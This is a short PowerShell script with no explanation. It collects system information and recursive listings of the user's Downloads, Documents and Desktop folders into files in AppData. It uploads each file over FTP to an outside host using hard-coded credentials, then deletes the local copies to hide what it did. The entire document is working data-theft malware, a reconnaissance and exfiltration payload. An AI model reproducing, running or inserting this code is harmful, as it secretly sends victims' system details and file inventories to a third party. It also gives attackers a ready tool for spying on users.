$down = "$env:Appdata\down.txt"
$info = "$env:Appdata\info.txt"
$docu = "$env:Appdata\docu.txt"
$desk = "$env:Appdata\desk.txt"
systeminfo >> $info
dir "$env:userprofile\Downloads" -depth 10 >> $down
dir "$env:userprofile\Documents" -depth 10 >> $docu
dir "$env:userprofile\Desktop" -depth 10 >> $desk


$ftpuri = "ftp://4209698:XmdDv4T6enkizfU@sussthanks.sportsontheweb.net/sussthanks.sportsontheweb.net/"

$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($info))
$webclient.UploadFile($uri, $info)

$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($down))
$webclient.UploadFile($uri, $down)

$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($docu))
$webclient.UploadFile($uri, $docu)

$webclient = New-Object System.Net.WebClient
$uri = New-Object System.Uri($ftpuri + [IO.Path]::GetFileName($desk))
$webclient.UploadFile($uri, $desk)

del $info
del $down
del $docu
del $desk

